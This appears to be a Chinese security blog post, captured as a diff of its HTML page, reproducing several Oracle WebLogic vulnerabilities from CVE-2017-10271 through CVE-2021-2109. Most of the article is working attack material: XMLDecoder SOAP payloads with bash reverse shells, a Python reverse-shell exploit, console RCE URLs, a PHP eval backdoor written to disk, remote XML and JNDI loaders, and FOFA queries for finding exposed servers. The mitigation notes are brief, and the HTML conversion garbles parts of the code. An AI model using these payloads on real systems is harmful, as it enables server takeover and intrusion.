@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>Weblogic | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="漏洞复现,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客0v0</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 博客重建中，还有其他细节文章</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/hcncn6" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2022-09-05
+    </span>
+    
+      <span>
+        | <a href="/categories/漏洞复现/"><i class="fa fa-bookmark"></i>漏洞复现</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    Weblogic
+  </h1>
+  
+  <article class="passage-article">
+    <p><code>`</code><br>Weblogic简介<br>    Weblogic是美国Orcle公司出品的一个应用服务器（application server），确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p>
+<pre><code>注意：weblogic的最新版本需要jdk1.8以上，如果jdk1.7或者以下，可能会出现安装不了的情况，亲测12.1.3，在jsk为1.7的版本可以安装，jdk1.6的话应该只能用10.3.6及以下。
+</code></pre><p> XMLDecoder 反序列化漏洞<br>    （CVE-2017-10271 &amp; CVE-2017-3506）</p>
+<pre><code>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现的反序列化漏洞，导致可执行任意命令。
+
+漏洞不仅存在于 /wls-wsat/CoordinatorPortType ，只要是在wls-wsat包中的Uri皆受到影响，可以查看web.xml得知所有收到影响的Uri，路径为：
+</code></pre><p>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\wls-wsat\54p17w\war\WEB-INF\web.xml<br>    默认收到影响的Uri如下：</p>
+<pre><code>/wls-wsat/CoordinatorPortType
+</code></pre><p>/wls-wsat/RegistrationPortTypeRPC<br>/wls-wsat/ParticipantPortType<br>/wls-wsat/RegistrationRequesterPortType<br>/wls-wsat/CoordinatorPortType11<br>/wls-wsat/RegistrationPortTypeRPC11<br>/wls-wsat/ParticipantPortType11<br>/wls-wsat/RegistrationRequesterPortType11<br>    利用1<br>        POST /wls-wsat/CoordinatorPortType HTTP/1.1<br>Host: 4587:7001<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: text/xml<br>Content-Length: 638</p>
+<p>&lt;soapenv:Envelope xmlns:soapenv=”<a href="http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;" target="_blank" rel="noopener">http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</a><br>    <a href="soapenv:Header" target="_blank" rel="noopener">soapenv:Header</a><br>    &lt;work:WorkContext xmlns:work=”<a href="http://bea.com/2004/06/soap/workarea/&quot;&gt;" target="_blank" rel="noopener">http://bea.com/2004/06/soap/workarea/&quot;&gt;</a><br>    <java><java version="1.4.0" class="java.beans.XMLDecoder"><br>    <object class="java.io.PrintWriter"> </object></java></java></p>
+<p><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string><br>    <void method="println"><string><br>    &lt;![CDATA[<br>&lt;% out.print(“test”); %&gt;<br>    ]]&gt;<br>    </string><br>    </void><br>    <void method="close"><br>    <br>    &lt;/work:WorkContext&gt;<br>    &lt;/soapenv:Header&gt;<br>    <a href="soapenv:Body/" target="_blank" rel="noopener">soapenv:Body/</a><br>&lt;/soapenv:Envelope&gt;</void></p>
+<pre><code>    http://45:7001/bea_wls_internal/test.jsp
+
+利用2
+    POST /wls-wsat/CoordinatorPortType HTTP/1.1
+</code></pre><p>Host: your-ip:7001<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: text/xml<br>Content-Length: 633</p>
+<p>&lt;soapenv:Envelope xmlns:soapenv=”<a href="http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;" target="_blank" rel="noopener">http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</a> <a href="soapenv:Header" target="_blank" rel="noopener">soapenv:Header</a><br>&lt;work:WorkContext xmlns:work=”<a href="http://bea.com/2004/06/soap/workarea/&quot;&gt;" target="_blank" rel="noopener">http://bea.com/2004/06/soap/workarea/&quot;&gt;</a></p>
+<p><java version="1.4.0" class="java.beans.XMLDecoder"></java></p>
+<p><void class="java.lang.ProcessBuilder"></void></p>
+<p><array class="java.lang.String" length="3"></array></p>
+<p><void index="0"></void></p>
+<p><string>/bin/bash</string><br></p>
+<p><void index="1"></void></p>
+<p><string>-c</string><br></p>
+<p><void index="2"></void></p>
+<p><string>bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1</string><br><br></p>
+<p><void method="start"></void><br><br>&lt;/work:WorkContext&gt;<br>&lt;/soapenv:Header&gt;<br><a href="soapenv:Body/" target="_blank" rel="noopener">soapenv:Body/</a><br>&lt;/soapenv:Envelope&gt;</p>
+<pre><code>防护
+    1.临时解决方案
+    根据攻击者利用POC分析发现所利用的为wls-wsat组件的CoordinatorPortType接口，若Weblogic服务器集群中未应用此组件，建议临时备份后将此组件删除，当形               成防护能力后，再进行恢复。
+    根据实际环境路径，删除WebLogic wls-wsat组件：
+    rm -f   /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war
+    rm -f   /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
+    rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
+    删除后重启Weblogic域控制器服务:
+    DOMAIN_NAME/bin/stopWeblogic.sh           #停止服务
+     DOMAIN_NAME/bin/startManagedWebLogic.sh    #启动服务
+    删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为404页面。
+
+2.官方补丁修复
+    前往Oracle官网下载10月份所提供的安全补丁
+    http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
+    升级过程可参考：
+    http://blog.csdn.net/qqlifu/article/details/49423839
+反弹shell的exp
+
+    #!/usr/bin/python3
+</code></pre><p>#-<em>- coding:utf-8 -</em>-</p>
+<h1 id="author-PeiQi"><a href="#author-PeiQi" class="headerlink" title="author : PeiQi"></a>author : PeiQi</h1><h1 id="from-http-wiki-peiqi-tech"><a href="#from-http-wiki-peiqi-tech" class="headerlink" title="from   : http://wiki.peiqi.tech"></a>from   : <a href="http://wiki.peiqi.tech" target="_blank" rel="noopener">http://wiki.peiqi.tech</a></h1><p>import requests<br>import sys<br>import json</p>
+<p>def title():<br>    print(‘+——————————————‘)<br>    print(‘+  \033[34mPOC_Des: <a href="http://wiki.peiqi.tech" target="_blank" rel="noopener">http://wiki.peiqi.tech</a>                                   \033[0m’)<br>    print(‘+  \033[34mGithub : <a href="https://github.com/PeiQi0" target="_blank" rel="noopener">https://github.com/PeiQi0</a>                                 \033[0m’)<br>    print(‘+  \033[34m公众号 : PeiQi文库                                                     \033[0m’)<br>    print(‘+  \033[34mVersion: Weblogic 10.3.6.0.0            \033[0m’)<br>    print(‘+  \033[34m         Weblogic 12.1.3.0.0            \033[0m’)<br>    print(‘+  \033[34m         Weblogic 12.2.1.0.0            \033[0m’)<br>    print(‘+  \033[34m         Weblogic 12.2.1.2.0            \033[0m’)<br>    print(‘+  \033[36m使用格式: python3 CVE-2017-10271.py      \033[0m’)<br>    print(‘+  \033[36mUrl    &gt;&gt;&gt; <a href="http://xxx.xxx.xxx.xxx:7001" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:7001</a>  \033[0m’)<br>    print(‘+  \033[36mCmd    &gt;&gt;&gt; shell(反弹shell)              \033[0m’)<br>    print(‘+——————————————‘)</p>
+<p>def POC_1(target_url, IP, PORT):<br>    vuln_url = target_url + “s-wsat/CoordinatorPortType”<br>    headers = {<br>        “Content-Type”: “text/xml”,<br>        “User-Agent”: “Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36”,<br>    }<br>    data = “””<br>        &lt;soapenv:Envelope xmlns:soapenv=”<a href="http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;" target="_blank" rel="noopener">http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</a> <a href="soapenv:Header" target="_blank" rel="noopener">soapenv:Header</a><br>        &lt;work:WorkContext xmlns:work=”<a href="http://bea.com/2004/06/soap/workarea/&quot;&gt;" target="_blank" rel="noopener">http://bea.com/2004/06/soap/workarea/&quot;&gt;</a><br>        <java version="1.4.0" class="java.beans.XMLDecoder"><br>        <void class="java.lang.ProcessBuilder"><br>        <array class="java.lang.String" length="3"><br>        <void index="0"><br>        <string>/bin/bash</string><br>        <oid><br>        <void index="1"><br>        <string>-c</string><br>        <oid><br>        <void index="2"><br>        <string>bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1</string><br>        <oid><br>        </oid></void></oid></void></oid></void></array><br>        <void method="start"><oid><br>        </oid></void></void></java><br>        &lt;/work:WorkContext&gt;<br>        &lt;/soapenv:Header&gt;<br>        <a href="soapenv:Body/" target="_blank" rel="noopener">soapenv:Body/</a><br>        &lt;/soapenv:Envelope&gt;<br>    “”” % (IP,PORT)<br>    try:<br>        response = requests.request(“POST”, url=vuln_url, headers=headers, data=data)<br>    except:<br>        print(“\033[31m[x] 漏洞利用失败 \033[0m”)</p>
+<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    title()<br>    target_url = str(input(“\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m”))<br>    IP = str(input(“\033[35m请输入监听IP   &gt;&gt;&gt; \033[0m”))<br>    PORT = str(input(“\033[35m请输入监听PORT &gt;&gt;&gt; \033[0m”))<br>    POC_1(target_url, IP, PORT)</p>
+<p>CVE-2019-2725<br>    简述<br>        CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，<br>这个漏洞依旧是根据weblogic的xmldecoder反序列化漏洞，<br>通过针对Oracle官网历年来的补丁构造payload来绕过。<br>    影响版本<br>            weblogic 10.x<br>    weblogic 12.1.3<br>    路径<br>        /_async/AsyncResponseService<br>/_async/AsyncResponseServiceJms<br>/_async/AsyncResponseServiceHttps<br>/_async/AsyncResponseServiceSoap12<br>/_async/AsyncResponseServiceSoap12Jms<br>/_async/AsyncResponseServiceSoap12Https<br>        <a href="http://192.168.253.143:7001/_async/#" target="_blank" rel="noopener">http://192.168.253.143:7001/_async/#</a> 返回403则存在，返回404则不存在<br>    复现<br>        第一步 访问控制台<br><a href="http://192.168.253.143:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.253.143:7001/console/login/LoginForm.jsp</a><br>    修复</p>
+<pre><code>1. 及时打上官方CVE-2019-2725补丁包。官方已于4月26日公布紧急补丁包，下载地址：
+</code></pre><p>补丁包<br>2.升级本地JDK版本<br>因为Weblogic所采用的是其安装文件中默认1.6版本的JDK文件，属于存在反序列化漏洞的JDK版本，因此升级到JDK7u21以上版本可以避免由于Java原生类反序列化漏洞造成的远程代码执行。<br>3.配置URL访问控制策略<br>部署于公网的WebLogic服务器，可通过ACL禁止对/_async/及/wls-wsat/路径的访问。<br>4.删除不安全文件<br>删除wls9_async_response.war与wls-wsat.war文件及相关文件夹，并重启Weblogic服务。具体文件路径如下<br>CVE-2018-2628 t3<br>    简述<br>        Weblogic Server WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过T3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p>
+<pre><code>Java反序列化漏洞成因：
+</code></pre><p>在上述情况中所说的转换过程中，出现了漏洞，加之暴露或间接暴露出可反序列化的API，导致用户可以操作，并传入数据，或精心构造恶意代码。<br>        涉及版本：<br>            10.3.6.0<br>12.1.3.0<br>12.2.1.2<br>12.2.1.3<br>    利用<br>        下载poc<br>git clone <a href="https://github.com/jas502n/CVE-2018-2628.git" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2018-2628.git</a><br>进入CVE-2018-2628目录执行getshell命令<br>python CVE-2018-2628-Getshell.py 192.168.20.128 7001 shell1.jsp<br>python CVE-2018-2628-Getshell.py ip port shell1.jsp</p>
+<pre><code>防护方法
+
+    1.及时更新补丁
+</code></pre><p>2.禁用T3协议<br>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源<br>Weblogic 任意文件上传漏洞（CVE-2018-2894）<br>    漏洞简介：</p>
+<pre><code>    Weblogic Web Service Test Page 中一处任意文件上传漏洞，Web Service Test Page 在“生产模式下”默认不开启，所以该漏洞有一定限制
+影响版本：
+
+    10.3.6
+</code></pre><p>12.1.3<br>12.2.1.2<br>12.2.1.3<br>    本地漏洞复现：</p>
+<pre><code>Weblogic管理端未授权访问的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为：
+</code></pre><p>/ws_utc/begin.do<br>/ws_utc/config.do<br>        登录后台页面，点击base_domain的配置，在 ‘高级’ 中勾选 ‘启用 Web 服务测试页’ 选项，然后保存配置。<br>        访问<a href="http://172.17.0.1:7001/ws_utc/config.do，设置Work" target="_blank" rel="noopener">http://172.17.0.1:7001/ws_utc/config.do，设置Work</a> Home Dir为<br>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css，访问这个目录是无需权限的，这一点很重要。</p>
+<pre><code>    审查元素,查看时间戳（也可使用抓包方式进行查看）
+    访问http://172.17.0.1:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell
+
+漏洞防御
+
+    1、 设置config.do,begin.do页面登录授权后访问；
+</code></pre><p>2、 IPS等防御产品可以加入相应的特征；<br>3、 升级到官方的最新版本；<br>Weblogic SSRF漏洞（CVE-2014-4210）<br>    影响版本</p>
+<pre><code>10.0.2.0
+</code></pre><p>10.3.6.0<br>    在weblogic 10.0.2–10.3.6.0版本，</p>
+<pre><code>http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp处存在漏洞，我们可以同通过构造请求来利用返回的错误信息来观察探测开放端口的状态等，甚至可以通过该ssrf构造任意http请求来攻击内网redis或fastcgi等组件。
+</code></pre><p>ssrf攻击形式：<br>1.我们可以在目标url后添加不同ip来根据回显信息了解服务器的一些信息或内网的信息<br>2.我们在ip后加不同的port也可以根据回显信息来判断服务或一些端口信息，实现内网端口扫描<br>3.最严重的，ssrf可以通过构造一些危险url获取到一些信息，比如管理员密码，之后上传webshell<br>或者对于一些薄弱的网址或不安全的管理界面入手进行，利用其弱点进行构造脚本，来实现远程代码执行。<br>        漏洞复现：</p>
+<pre><code>验证漏洞，验证是否可以正常访问 /uddiexplorer/SearchPublicRegistries.jsp ，若能正常访问，则可能存在此漏洞，填写任意信息，如下：
+https://github.com/NoneNotNull/SSRFX
+</code></pre><p>CVE-2020-14882<br>    简述<br>        WebLogic远程代码执行漏洞（漏洞编号：CVE-2020-14882）的补丁存在绕过风险，远程攻击者可以构造特殊的 HTTP 请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic ServerConsole 执行任意代码。<br>        二 、影响版本<br>Oracle WeblogicServer 10.3.6.0.0<br>Oracle WeblogicServer 12.1.3.0.0<br>Oracle WeblogicServer 12.2.1.3.0<br>Oracle WeblogicServer 12.2.1.4.0<br>Oracle WeblogicServer 14.1.1.0.0</p>
+<pre><code>利用1
+    http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/111.txt%27);%22)
+
+     /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&apos;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getHeader(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd} : new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();&apos;)
+
+    Accept-Encoding: gzip, deflate
+</code></pre><p>cmd:id &amp;&amp;<br>Connection: close</p>
+<pre><code>知道了当前页面的路径为
+
+    /u01/oracle/user_projects/domains/base_domain，然后我们就可以在该目录下写入后门文件，此时是通过向backdoor.jsp输入一句话
+
+    cmd : whoami &amp;&amp; pwd &amp; echo &apos; &lt;?php @eval($_PosT [ &apos; attack &quot;]);?&gt;’&gt; 
+</code></pre><p>/u01/oracle/wlserver/server/lib/consoleapp/webapp/images/ backdoor.jsp<br>    利用3<br>        <a href="https://github.com/GGyao/CVE-2020-14882_ALL" target="_blank" rel="noopener">https://github.com/GGyao/CVE-2020-14882_ALL</a></p>
+<pre><code>python3 CVE-2020-14882_ALL.py -u http://1.1.1.1:7001 -c &quot;whoami&quot;
+python3 CVE-2020-14882_ALL.py -f target.txt -c &quot;whoami&quot;
+</code></pre><p>target.txt 格式：<a href="http://x.x.x.x:xx，一行一个。" target="_blank" rel="noopener">http://x.x.x.x:xx，一行一个。</a><br>            &lt;?xml version=”1.0” encoding=”UTF-8” ?&gt;</p>
+<p><beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"></beans></p>
+<p><bean id="pb" class="java.lang.ProcessBuilder" init-method="start"></bean></p>
+<p><constructor-arg></constructor-arg></p>
+<p><list></list></p>
+<p><value>bash</value></p>
+<p><value>-c</value></p>
+<p><value>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.10.129/8899 0&gt;&amp;1]]&gt;</value><br><br><br><br>&lt;/beans</p>
+<pre><code>    http://192.168.27.187:7001/console/images/%252E%252E%252Fconsole.portal?nfpb=true&amp;pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(&quot;http://192.168.27.180/poc-bash.xml&quot;)
+    python -m http.server 8000
+修复
+    目前 Oracle 官方已发布了最新针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。Oracle 官方补丁需要用户持有正版软件的许可账号，使用该账号登陆 https://support.oracle.com 后，可以下载最新补丁。
+</code></pre><p>IIOP反序列化漏洞 CVE-2020-2551<br>    简述<br>        经过分析这次漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了,T3协议使用的是resolveClass方法去过滤的,resolveClass方法是会读取父类的,所以T3协议这样过滤是没问题的。但是IIOP协议这块,虽然也是使用的这个黑名单列表,但不是使用resolveClass方法去判断的,这样默认只会判断本类的类名,而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了,而JtaTransactionManager类是存在jndi注入的。</p>
+<pre><code>漏洞影响版本：
+    Oracle WebLogic Server 10.3.6.0.0
+    Oracle WebLogic Server 12.1.3.0.0
+</code></pre><p>Oracle WebLogic Server 12.2.1.3.0<br>Oracle WebLogic Server 12.2.1.4.0<br>该漏洞主要是因为Weblogic默认开放IIOP协议，并且 JtaTransactionManager 并未做黑名单过滤导致漏洞发生。<br>    利用<br>        linux<br>        import java.io.IOException;</p>
+<p>public class exp {<br>    static{<br>        try {<br>            java.lang.Runtime.getRuntime().exec(new String[]{“/bin/bash”,”-c”,”touch /tmp/url.txt”});<br>        } catch (IOException e) {<br>            // TODO Auto-generated catch block<br>            e.printStackTrace();<br>        }<br>    }<br>    public static void main(String[] args) {</p>
+<pre><code>}
+</code></pre><p>}</p>
+<p>win<br>        import java.io.IOException;</p>
+<p>public class Poc {<br>    static{<br>        try {<br>            java.lang.Runtime.getRuntime().exec(new String[]{“cmd”,”/c”,”calc”});<br>        } catch (IOException e) {<br>            // TODO Auto-generated catch block<br>            e.printStackTrace();<br>        }<br>    }<br>    public static void main(String[] args) {</p>
+<pre><code>}
+</code></pre><p>}</p>
+<pre><code>    javac exp.java -source 1.6 -target 1.6
+    python3 -m http.server 80
+    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.177.1/#exp&quot; 1099
+
+    使用命令加载exp攻击靶机漏洞：java -jar weblogic_CVE_2020_2551.jar 192.168.177.129 7001 rmi://192.168.177.1:1099/exp
+
+安全防护：
+
+    1.修改Weblogic默认端口号，在config.xml文件修改 添加 &lt;listen-port&gt;8080&lt;/listen-port&gt;
+</code></pre><p>2.使用Oracle官方安全补丁进行更新修复<br>3.如果不依赖T3协议进行JVM通信用户可以通过控制T3协议的访问来临时阻断针对该漏洞的攻击<br>weblogic server提供了名为weblogic.security.net.ConnectionFilterImpl的默认连接筛选器，此连接筛选器接受所有传入连接，可通过此连接筛选器配置规则，对T3协议进行访问控制，具体操作如下：<br>进入Weblogic控制台，在base_domain的配置页面中，进入“安全”选项卡页面，点击“筛选器”，进入连接筛选器配置。<br>在连接筛选器中输入：security.net.ConnectionFilterImpl 在连接筛选器规则中配置符合实际情况的规则<br>保存后如果未生效，建议重启Weblogic。<br>T3盘点：<br><a href="https://zhzhdoai.github.io/2020/08/10/Weblogic-T3反序列化历史漏洞/#CVE-2019-2890" target="_blank" rel="noopener">https://zhzhdoai.github.io/2020/08/10/Weblogic-T3反序列化历史漏洞/#CVE-2019-2890</a><br><a href="https://www.secrss.com/articles/25852" target="_blank" rel="noopener">https://www.secrss.com/articles/25852</a>﻿<br>实战中，使用fofa查找weblogic站点：<br>“weblogic”<br>app=”Oracle-WebLogic-Server-管理控制台”<br>app=”BEA-WebLogic-Server” || app=”Weblogic_interface_7001”<br>CVE-2021-2109 (Weblogic Server远程代码执行漏洞)<br>    1.漏洞描述</p>
+<pre><code>2021年1月20日，Oracle官方发布了2021年1月关键补丁更新公告CPU（Critical Patch Update），CVE-2021-2109 Weblogic Server远程代码执行漏洞在内的多个高危严重漏洞。在CVE-2021-2109漏洞中，攻击者可构造恶意请求，造成JNDI注入、执行任意代码，从而控制服务器
+
+影响版本
+
+WebLogic 10.3.6.0.0
+</code></pre><p>WebLogic 12.1.3.0.0<br>WebLogic 12.2.1.3.0<br>WebLogic 12.2.1.4.0<br>WebLogic 14.1.1.0.0<br>        3.漏洞检测Oracle WebLogic Server 远程代码执行漏洞 （CVE-2021-2109），未经身份验证的远程攻击者可通过构造特殊的 HTTP GET 请求，漏洞的触发是在console组件，…/被二次编码成%252E%252E%252，未对二次编码的数据进行处理，导致编码后的数据未授权绕过。漏洞路径<a href="http://ip:port/console/css/%252e%252e%252f/consolejndi.portal" target="_blank" rel="noopener">http://ip:port/console/css/%252e%252e%252f/consolejndi.portal</a><br>        4.漏洞修复1、及时下载官方补丁进行升级修复。下载地址如下：<a href="https://www.oracle.com/security-alerts/cpujan2021.html2、关闭后台/console/console.portal的访问权限。3、修改后台默认地址。进入默认的控制台，例如“localhost/console”，进入后点击左侧的" target="_blank" rel="noopener">https://www.oracle.com/security-alerts/cpujan2021.html2、关闭后台/console/console.portal的访问权限。3、修改后台默认地址。进入默认的控制台，例如“localhost/console”，进入后点击左侧的</a> “域名称”-“高级选项”-“保存”，重启服务并清缓存<br>        复现<br>            java -jar JNDIExploit-v1.11.jar -i 192.168.50.139</p>
+<pre><code>POST /console/consolejndi.portal HTTP/1.1
+</code></pre><p>Host: 192.168.50.139:7001<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36<br>Accept: image/avif,image/webp,image/apng,image/<em>,</em>/*;q=0.8<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Cookie: ADMINCONSOLESESSION=1w6DgCLLkQhPRBqkQthhQvPqpT4SvTl22rSjK3kRHxw0WHLhnzG1!-766673213<br>Connection: close<br>Content-Length: 176<br>cmd:whoami</p>
+<p>_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.50;139:1389/Basic/WeblogicEcho;AdminServer%22)</p>
+<pre><code>POST /console/css/%252e%252e/consolejndi.portal  HTTP/1.1
+</code></pre><p>Host: 192.168.50.139:7001<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Length: 177<br>Connection: close</p>
+<p>?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.50;139:1389/Basic/WeblogicEcho;AdminServer%22)</p>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
